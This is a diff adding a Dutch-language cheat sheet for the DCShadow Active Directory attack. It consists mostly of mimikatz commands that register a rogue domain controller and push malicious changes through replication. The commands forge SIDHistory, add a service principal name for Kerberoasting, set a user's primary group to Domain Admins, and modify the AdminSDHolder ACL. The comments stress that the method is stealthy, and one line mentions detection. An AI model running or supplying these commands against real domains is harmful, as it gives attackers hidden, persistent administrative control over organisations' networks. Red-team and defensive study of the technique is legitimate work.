@@ -1,0 +1,30 @@
+# DCShadow — Rogue Domain Controller registratie
+# Registreer een nepserver als DC en push wijzigingen via AD replicatie
+# Zeer stealthy — wijzigingen worden als legitieme replicatie gezien
+#
+# === Vereisten ===
+# - Domain Admin rechten
+# - SYSTEM context op de aanvallende machine
+#
+# === Voorbeelden ===
+
+# Mimikatz DCShadow - Push SIDHistory wijziging
+# Terminal 1 (SYSTEM context): Start rogue DC
+mimikatz.exe "lsadump::dcshadow /object:targetuser /attribute:SIDHistory /value:S-1-5-21-...-519" exit
+
+# Terminal 2 (DA context): Trigger replicatie
+mimikatz.exe "lsadump::dcshadow /push" exit
+
+# SPN toevoegen (voor Kerberoasting)
+mimikatz.exe "lsadump::dcshadow /object:targetuser /attribute:servicePrincipalName /value:MSSQLSvc/fake.domain.local" exit
+
+# primaryGroupId wijzigen (naar Domain Admins = 512)
+mimikatz.exe "lsadump::dcshadow /object:targetuser /attribute:primaryGroupId /value:512" exit
+
+# AdminSDHolder ACL wijzigen
+mimikatz.exe "lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=domain,DC=local /attribute:ntSecurityDescriptor /value:..." exit
+
+# Noot: DCShadow registreert een nTDSDSA object in AD
+# Noot: Wijzigingen verschijnen als normale replicatie in logs
+# Noot: Detectie: Monitor nTDSDSA object creatie, onbekende replicatie-partners
+# Noot: Na de push wordt de rogue DC registratie automatisch opgeruimd
